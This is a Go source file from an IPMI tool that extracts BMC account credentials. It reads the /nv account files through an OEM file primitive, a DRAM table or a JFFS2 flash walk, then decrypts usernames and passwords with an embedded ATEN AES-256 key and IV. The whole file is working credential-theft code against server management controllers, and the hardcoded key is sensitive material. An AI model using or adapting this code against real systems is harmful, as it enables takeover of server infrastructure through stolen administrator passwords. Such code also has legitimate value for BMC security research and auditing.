package ipmi

// Version-independent BMC credential dump over the memory-mapped SPI-flash window.
//
// Unlike the DRAM/shm walk (mem_shm.go), this needs NO kernel-version offsets and
// NO per-firmware constants. It uses only:
//   - the SoC-generic flash window base (MemProfile.FlashBase, FMC CS0), and
//   - the self-describing JFFS2 on-flash format, and
//   - the per-generation AES-256-CBC key that ATEN libipmi uses for the account
//     store (overridable; secret material, not an offset).
//
// The physical read is 1/2/4 bytes per request, so the walk is deliberately thin:
// most nodes cost ~4 requests (classify + advance + inode ino/version). Only the
// target files' inode payloads are read in full (pass 2). Progress is reported to
// the command spinner via reportCommandProgress so a multi-minute walk is visible.
//
// All reads come back in memory (little-endian) order, so JFFS2 magic 0x1985 is a
// u16 == 0x1985 and a node's first u32 is (magic | nodetype<<16).

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"sort"
	"strings"
)

// ATEN /nv PSBlock account encryption (verified present in X10 and X11 libipmi.so;
// AES-256-CBC, PKCS7). Per-generation secret material, overridable via the CLI.
const (
	atenPSAESKeyHex = "a1cda0c87db4c61fa76dfb7dc3bfbe83808c823eabb76a2bc97c1617e8cd6676"
	atenPSAESIVHex  = "2e7b4c71d0452a6b89b89af96ab3c6ca"
)

const (
	jffs2Magic      = 0x1985
	jffs2Dirent     = 0xE001
	jffs2Inode      = 0xE002
	jffs2ComprNone  = 0
	eraseBlock      = 0x10000
	credTargetFiles = "PSBlock OEMPSBlock shadow .admin factory_password"
)

// FlashCred is one recovered plaintext (a username or password).
type FlashCred struct {
	File      string `json:"file"`
	Offset    int    `json:"offset"`
	Length    int    `json:"length"`
	Plaintext string `json:"plaintext"`
}

// ShadowEntry is one parsed line of the X11 /nv/default/shadow file.
type ShadowEntry struct {
	ID       string `json:"id"`
	Name     string `json:"name"`
	Password string `json:"password"`
	Priv     string `json:"priv"`
	Enabled  string `json:"enabled"`
}

// FlashCredResult is the whole dump.
type FlashCredResult struct {
	Method        string        `json:"method"`
	PartitionPhys uint64        `json:"partitionPhys,omitempty"`
	NodesWalked   int           `json:"nodesWalked,omitempty"`
	FilesFound    []string      `json:"filesFound"`
	Creds         []FlashCred   `json:"creds"`
	Shadow        []ShadowEntry `json:"shadow,omitempty"`
	Notes         []string      `json:"notes,omitempty"`
}

// credFilePaths are the on-flash account stores, by absolute path. Reading them by
// path (OEMHW1 fd_read) lets the BMC kernel resolve the JFFS2, so no walk is
// needed and it is portable across firmware versions.
var credFilePaths = []string{"/nv/PSBlock", "/nv/OEMPSBlock", "/nv/default/shadow", "/nv/default/.admin", "/nv/factory_password"}

// MemDumpCreds dumps BMC account credentials by the FASTEST method the profile
// supports, falling back to the fully portable JFFS2 walk:
//  1. OEMHW1 fd_read of the /nv account files by path (255 B/req; kernel does the
//     JFFS2). Fast and portable-by-path; needs the OEMHW1 file primitive.
//  2. the DRAM shm cleartext table (mem globalvar). Fast; needs kernel offsets.
//  3. the JFFS2 flash walk. Slow but needs nothing build-specific.
//
// via forces a method: "file"/"oemhw1", "dram"/"shm", "jffs2"/"flash"/"walk";
// "" or "auto" selects the fastest available.
func (s *CmdSess) MemDumpCreds(ctx context.Context, p *MemProfile, keyHex, ivHex, via string) (*FlashCredResult, error) {
	block, iv, err := credCipher(keyHex, ivHex)
	if err != nil {
		return nil, err
	}
	via = strings.ToLower(strings.TrimSpace(via))
	switch via {
	case "file", "oemhw1":
		return s.credsViaOEMHW1File(ctx, p, block, iv)
	case "dram", "shm", "globalvar":
		return s.credsViaShm(ctx, p)
	case "jffs2", "flash", "walk":
		return s.MemDumpFlashCreds(ctx, p, keyHex, ivHex)
	case "", "auto":
		// fastest available
	default:
		return nil, fmt.Errorf("unknown creds via=%q (use auto|file|dram|jffs2)", via)
	}
	if p.OEMHW1Files {
		return s.credsViaOEMHW1File(ctx, p, block, iv)
	}
	if p.ShmWalk != nil {
		return s.credsViaShm(ctx, p)
	}
	return s.MemDumpFlashCreds(ctx, p, keyHex, ivHex)
}

func credCipher(keyHex, ivHex string) (cipher.Block, []byte, error) {
	if keyHex == "" {
		keyHex = atenPSAESKeyHex
	}
	if ivHex == "" {
		ivHex = atenPSAESIVHex
	}
	key, err := hex.DecodeString(keyHex)
	if err != nil || (len(key) != 16 && len(key) != 24 && len(key) != 32) {
		return nil, nil, fmt.Errorf("aeskey must be 16/24/32 bytes of hex")
	}
	iv, err := hex.DecodeString(ivHex)
	if err != nil || len(iv) != 16 {
		return nil, nil, fmt.Errorf("aesiv must be 16 bytes of hex")
	}
	block, err := aes.NewCipher(key)
	return block, iv, err
}

// credsViaShm reuses the DRAM GlobalVar cleartext table and presents it as paired
// account records.
func (s *CmdSess) credsViaShm(ctx context.Context, p *MemProfile) (*FlashCredResult, error) {
	if p.ShmWalk == nil {
		return nil, fmt.Errorf("profile %s has no shm-walk parameters (kernel offsets); cannot use the DRAM creds path", p.ID)
	}
	_, users, _, err := s.MemDumpGlobalVarUsers(ctx, p)
	if err != nil {
		return nil, err
	}
	res := &FlashCredResult{Method: "dram-shm (cleartext GlobalVar table)"}
	for _, u := range users {
		res.Shadow = append(res.Shadow, ShadowEntry{ID: fmt.Sprintf("%d", u.Slot), Name: u.Name, Password: u.Password})
	}
	if len(res.Shadow) == 0 {
		res.Notes = append(res.Notes, "GlobalVar table had no populated slots")
	}
	return res, nil
}

// readOEMHW1File stages a file with fd_open and streams it with fd_read (255 B
// per request), returning up to maxBytes.
func (s *CmdSess) readOEMHW1File(ctx context.Context, path string, maxBytes int) ([]byte, error) {
	if err := s.HW1FileOpen(path, HW1FileCopy); err != nil {
		return nil, err
	}
	out := make([]byte, 0, 4096)
	for len(out) < maxBytes {
		if err := ctx.Err(); err != nil {
			return out, err
		}
		want := HW1MaxFileRead
		if maxBytes-len(out) < want {
			want = maxBytes - len(out)
		}
		chunk, err := s.HW1FileRead(uint32(len(out)), want)
		if err != nil {
			return out, err
		}
		if len(chunk) == 0 {
			break // EOF
		}
		out = append(out, chunk...)
		if len(chunk) < want {
			break // short read = EOF
		}
	}
	return out, nil
}

// credsViaOEMHW1File reads the /nv account files by path via fd_read and recovers
// credentials. No JFFS2 walk and no per-firmware offsets: the kernel resolves the
// path, so this is fast and portable across firmware versions of gens that carry
// the OEMHW1 file primitive.
func (s *CmdSess) credsViaOEMHW1File(ctx context.Context, p *MemProfile, block cipher.Block, iv []byte) (*FlashCredResult, error) {
	if !p.OEMHW1Files {
		return nil, fmt.Errorf("profile %s has no OEMHW1 file-read primitive; cannot use the file creds path", p.ID)
	}
	res := &FlashCredResult{Method: "oemhw1-file (fd_read by path)"}
	// account files are small (PSBlock ~9 KB); cap the read so a handler that pads
	// past EOF cannot turn this into a long transfer.
	const maxFile = 32 * 1024
	for _, path := range credFilePaths {
		reportCommandProgress(ctx, "mem creds: fd_read %s", path)
		img, err := s.readOEMHW1File(ctx, path, maxFile)
		if err != nil || len(img) == 0 {
			continue // absent on this generation; try the next
		}
		res.FilesFound = append(res.FilesFound, fmt.Sprintf("%s (%d bytes)", path, len(img)))
		if strings.HasSuffix(path, "shadow") {
			res.Shadow = append(res.Shadow, parseShadow(img, block, iv)...)
			continue
		}
		res.Creds = append(res.Creds, decryptScan(path, img, block, iv)...)
	}
	if len(res.FilesFound) == 0 {
		res.Notes = append(res.Notes, "OEMHW1 fd_read reached none of the /nv account files")
	}
	return res, nil
}

// jffs2DataNode is one INODE payload fragment (pass-2 detail).
type jffs2DataNode struct {
	version uint32
	offset  uint32
	dsize   uint32
	compr   byte
	dataAt  uint64
}

// inodePos is the pass-1 record for an INODE node: just its position and inode
// number, enough to filter to the target files. version/offset/dsize/compr are
// read only for target nodes in pass 2.
type inodePos struct {
	cur uint64
	ino uint32
}

func (s *CmdSess) flashU32(p *MemProfile, phys uint64) (uint32, bool) {
	d, cc, err := s.MemReadUnitAt(p, phys, 4)
	if err != nil || cc != 0x00 || len(d) < 4 {
		return 0, false
	}
	return binary.LittleEndian.Uint32(d), true
}

func (s *CmdSess) flashRead(ctx context.Context, p *MemProfile, phys uint64, n int) ([]byte, error) {
	data, _, _, err := s.MemReadPhysical(ctx, p, phys, n, MemReadOptions{Unit: p.MaxUnit})
	return data, err
}

func nextBlock(cur uint64) uint64 { return (cur &^ (eraseBlock - 1)) + eraseBlock }

// FindJFFS2Partition scans erase-block boundaries in the flash window for the
// first block that is a JFFS2 node (magic 0x1985) and returns the contiguous run
// of JFFS2/erased blocks as [start, end).
func (s *CmdSess) FindJFFS2Partition(ctx context.Context, p *MemProfile) (start, end uint64, err error) {
	if p.FlashBase == 0 || p.FlashSize == 0 {
		return 0, 0, fmt.Errorf("profile %s has no memory-mapped flash window", p.ID)
	}
	base, size := p.FlashBase, p.FlashSize
	for off := uint64(0); off < size; off += eraseBlock {
		if off%(16*eraseBlock) == 0 {
			reportCommandProgress(ctx, "mem creds: scanning flash for /nv JFFS2 at 0x%08x", base+off)
		}
		w, ok := s.flashU32(p, base+off)
		isJFFS2 := ok && (w&0xffff) == jffs2Magic
		isErased := !ok || w == 0xffffffff
		switch {
		case isJFFS2:
			if start == 0 {
				start = base + off
			}
			end = base + off + eraseBlock
		case start != 0 && isErased:
			end = base + off + eraseBlock // erased block inside the partition
		case start != 0:
			return start, end, nil // a different filesystem: partition ends here
		}
	}
	if start == 0 {
		return 0, 0, fmt.Errorf("no JFFS2 partition found in the flash window (scanned %d erase blocks from 0x%08x)", size/eraseBlock, base)
	}
	return start, end, nil
}

// walkJFFS2 is pass 1: it traverses the node chain cheaply (classify + advance,
// ~2 reads/node; +2 for an inode's ino/version; DIRENT name for the few dirents),
// returning the resolved name->ino map and every inode node's position.
func (s *CmdSess) walkJFFS2(ctx context.Context, p *MemProfile, start, end uint64) (map[string]uint32, []inodePos, int) {
	type direntV struct{ ino, ver uint32 }
	dirents := map[string]direntV{}
	var inodes []inodePos
	const maxNodes = 300000
	nodes := 0
	for cur := start; cur < end && nodes < maxNodes; {
		nodes++
		if nodes%64 == 0 {
			reportCommandProgress(ctx, "mem creds: walking JFFS2, %d nodes, %d dirents, %d inode-nodes", nodes, len(dirents), len(inodes))
		}
		w0, ok := s.flashU32(p, cur)
		if !ok || w0 == 0xffffffff {
			cur = nextBlock(cur)
			continue
		}
		if (w0 & 0xffff) != jffs2Magic {
			cur = nextBlock(cur)
			continue
		}
		ntype := w0 >> 16
		totlen, ok := s.flashU32(p, cur+0x04)
		if !ok || totlen < 0x0c || totlen > eraseBlock {
			cur = nextBlock(cur)
			continue
		}
		switch ntype {
		case jffs2Dirent:
			buf, e := s.flashRead(ctx, p, cur+0x10, min(int(totlen)-0x10, 0x18+256))
			// buf starts at node+0x10: version@+0, ino@+0x04, nsize@+0x0c, name@+0x18
			if e == nil && len(buf) >= 0x19 {
				ver := binary.LittleEndian.Uint32(buf[0:4])
				ino := binary.LittleEndian.Uint32(buf[4:8])
				nsize := int(buf[0x0c])
				if nsize > 0 && 0x18+nsize <= len(buf) {
					name := string(buf[0x18 : 0x18+nsize])
					if prev, ok := dirents[name]; !ok || ver >= prev.ver {
						dirents[name] = direntV{ino: ino, ver: ver}
					}
				}
			}
		case jffs2Inode:
			ino, _ := s.flashU32(p, cur+0x0c)
			inodes = append(inodes, inodePos{cur: cur, ino: ino})
		}
		cur += (uint64(totlen) + 3) &^ 3
	}
	names := make(map[string]uint32, len(dirents))
	for name, d := range dirents {
		if d.ino != 0 { // ino 0 at the highest version = deleted
			names[name] = d.ino
		}
	}
	return names, inodes, nodes
}

// readInodeNode is pass 2: read the payload-placement fields of one INODE node.
func (s *CmdSess) readInodeNode(ctx context.Context, p *MemProfile, cur uint64) (jffs2DataNode, bool) {
	buf, e := s.flashRead(ctx, p, cur+0x10, 0x38-0x10+4) // covers version@+0, offset@+0x1c, dsize@+0x24, compr@+0x28
	if e != nil || len(buf) < 0x2c {
		return jffs2DataNode{}, false
	}
	dn := jffs2DataNode{
		version: binary.LittleEndian.Uint32(buf[0:4]),
		offset:  binary.LittleEndian.Uint32(buf[0x1c:0x20]),
		dsize:   binary.LittleEndian.Uint32(buf[0x24:0x28]),
		compr:   buf[0x28],
		dataAt:  cur + 0x44,
	}
	if dn.dsize == 0 || dn.dsize > eraseBlock {
		return jffs2DataNode{}, false
	}
	return dn, true
}

// reassembleInode rebuilds a file from its INODE data nodes: for each byte range
// the highest-version node wins. Only uncompressed (compr==NONE) fragments are
// placed; a compressed fragment is reported as a gap.
func (s *CmdSess) reassembleInode(ctx context.Context, p *MemProfile, nodes []jffs2DataNode) ([]byte, []string) {
	var notes []string
	sort.Slice(nodes, func(i, j int) bool { return nodes[i].version > nodes[j].version })
	var size uint32
	for _, n := range nodes {
		if n.offset+n.dsize > size {
			size = n.offset + n.dsize
		}
	}
	if size == 0 || size > 4*1024*1024 {
		return nil, []string{"inode has no plausible size"}
	}
	out := make([]byte, size)
	filled := make([]bool, size)
	for _, n := range nodes {
		if n.compr != jffs2ComprNone {
			notes = append(notes, fmt.Sprintf("skipped a compressed fragment at file offset 0x%x (compr=%d)", n.offset, n.compr))
			continue
		}
		data, err := s.flashRead(ctx, p, n.dataAt, int(n.dsize))
		if err != nil || len(data) < int(n.dsize) {
			notes = append(notes, fmt.Sprintf("read of fragment at file offset 0x%x failed", n.offset))
			continue
		}
		for i := 0; i < int(n.dsize); i++ {
			pos := int(n.offset) + i
			if pos < len(out) && !filled[pos] {
				out[pos] = data[i]
				filled[pos] = true
			}
		}
	}
	return out, notes
}

// decryptScan recovers plaintext credentials from a file image with no knowledge
// of the record geometry: AES-CBC-decrypt every 16/32-byte candidate and keep the
// ones that yield valid PKCS7 padding + printable text.
func decryptScan(file string, img []byte, block cipher.Block, iv []byte) []FlashCred {
	var out []FlashCred
	seen := map[int]bool{}
	for off := 0; off+16 <= len(img); off++ {
		if seen[off] {
			continue
		}
		for _, l := range []int{32, 16} {
			if off+l > len(img) {
				continue
			}
			pt := make([]byte, l)
			cipher.NewCBCDecrypter(block, iv).CryptBlocks(pt, img[off:off+l])
			if s, ok := pkcs7Printable(pt); ok {
				out = append(out, FlashCred{File: file, Offset: off, Length: l, Plaintext: s})
				for i := 0; i < l; i++ {
					seen[off+i] = true
				}
				break
			}
		}
	}
	return out
}

// pkcs7Printable strips PKCS7 padding and requires non-empty printable ASCII.
func pkcs7Printable(pt []byte) (string, bool) {
	if len(pt) == 0 {
		return "", false
	}
	pad := int(pt[len(pt)-1])
	if pad < 1 || pad > 16 || pad > len(pt) {
		return "", false
	}
	for _, b := range pt[len(pt)-pad:] {
		if int(b) != pad {
			return "", false
		}
	}
	body := pt[:len(pt)-pad]
	if len(body) == 0 {
		return "", false
	}
	for _, b := range body {
		if b < 0x20 || b > 0x7e {
			return "", false
		}
	}
	return string(body), true
}

// parseShadow parses the X11 /nv/default/shadow ASCII file.
func parseShadow(img []byte, block cipher.Block, iv []byte) []ShadowEntry {
	var out []ShadowEntry
	for _, line := range strings.Split(string(img), "\n") {
		line = strings.TrimSpace(strings.Trim(line, "\x00"))
		if line == "" {
			continue
		}
		f := strings.Split(line, ";")
		if len(f) < 3 {
			continue
		}
		e := ShadowEntry{ID: f[0]}
		e.Name = decHexCBC(f[1], block, iv)
		e.Password = decHexCBC(f[2], block, iv)
		if len(f) > 3 {
			e.Priv = f[3]
		}
		if len(f) > 4 {
			e.Enabled = f[4]
		}
		if e.Name != "" || e.Password != "" {
			out = append(out, e)
		}
	}
	return out
}

func decHexCBC(h string, block cipher.Block, iv []byte) string {
	b, err := hex.DecodeString(h)
	if err != nil || len(b) < 16 || len(b)%16 != 0 {
		return ""
	}
	pt := make([]byte, len(b))
	cipher.NewCBCDecrypter(block, iv).CryptBlocks(pt, b)
	if s, ok := pkcs7Printable(pt); ok {
		return s
	}
	return ""
}

// MemDumpFlashCreds is the fully portable, version-independent JFFS2 walk.
func (s *CmdSess) MemDumpFlashCreds(ctx context.Context, p *MemProfile, keyHex, ivHex string) (*FlashCredResult, error) {
	block, iv, err := credCipher(keyHex, ivHex)
	if err != nil {
		return nil, err
	}

	start, end, err := s.FindJFFS2Partition(ctx, p)
	if err != nil {
		return nil, err
	}
	res := &FlashCredResult{Method: "jffs2-walk (flash window)", PartitionPhys: start}
	res.Notes = append(res.Notes, fmt.Sprintf("JFFS2 partition 0x%08x-0x%08x", start, end))

	names, inodePositions, nodes := s.walkJFFS2(ctx, p, start, end)
	res.NodesWalked = nodes

	targets := strings.Fields(credTargetFiles)
	targetIno := map[uint32]string{}
	for _, t := range targets {
		if ino, ok := names[t]; ok {
			targetIno[ino] = t
		}
	}
	// pass 2: gather the target inodes' data nodes
	byIno := map[uint32][]jffs2DataNode{}
	for _, ip := range inodePositions {
		if _, want := targetIno[ip.ino]; !want {
			continue
		}
		if dn, ok := s.readInodeNode(ctx, p, ip.cur); ok {
			byIno[ip.ino] = append(byIno[ip.ino], dn)
		}
	}
	for ino, name := range targetIno {
		dn := byIno[ino]
		if len(dn) == 0 {
			continue
		}
		reportCommandProgress(ctx, "mem creds: reassembling %s (ino %d, %d fragments)", name, ino, len(dn))
		img, notes := s.reassembleInode(ctx, p, dn)
		res.Notes = append(res.Notes, notes...)
		if len(img) == 0 {
			continue
		}
		res.FilesFound = append(res.FilesFound, fmt.Sprintf("%s (ino %d, %d bytes)", name, ino, len(img)))
		if name == "shadow" {
			res.Shadow = append(res.Shadow, parseShadow(img, block, iv)...)
			continue
		}
		res.Creds = append(res.Creds, decryptScan(name, img, block, iv)...)
	}
	if len(res.FilesFound) == 0 {
		res.Notes = append(res.Notes, fmt.Sprintf("walked %d nodes but found none of {%s} (DIRENT names seen: %d)", nodes, credTargetFiles, len(names)))
	}
	return res, nil
}
